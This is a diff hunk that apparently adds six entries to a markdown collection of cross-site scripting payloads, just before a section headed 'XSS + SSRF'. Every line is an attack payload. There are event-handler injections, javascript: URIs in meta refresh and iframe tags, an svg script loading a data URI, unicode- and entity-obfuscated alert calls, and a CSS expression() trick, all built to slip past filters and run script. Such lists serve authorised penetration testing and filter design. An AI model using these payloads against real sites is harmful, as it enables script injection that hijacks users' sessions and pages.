@@ -132,7 +132,12 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/*+*/oNcliCk=alert()+)//%0D%0A%0d%0a//</stYle/</
 <img src="x:gif" onerror="window['al\u0065rt'](0)"></img>
 <iframe/src="data:text/html,<svg onload=alert(document.domain)>">
 <meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(document.domain)" http-equiv="refresh"/>
-
+<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script
+<meta http-equiv="refresh" content="0;url=javascript:confirm(document.domain)">
+<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
+<form><a href="javascript:\u0061lert(document.domain)">X
+</script><img/*%00/src="worksinchrome&colon;prompt(document.domain)"/%00*/onerror='eval(src)'>
+<style>//*{x:expression(alert(/document.domain/))}//<style></style>
 ```
 
 ## XSS + SSRF <br>
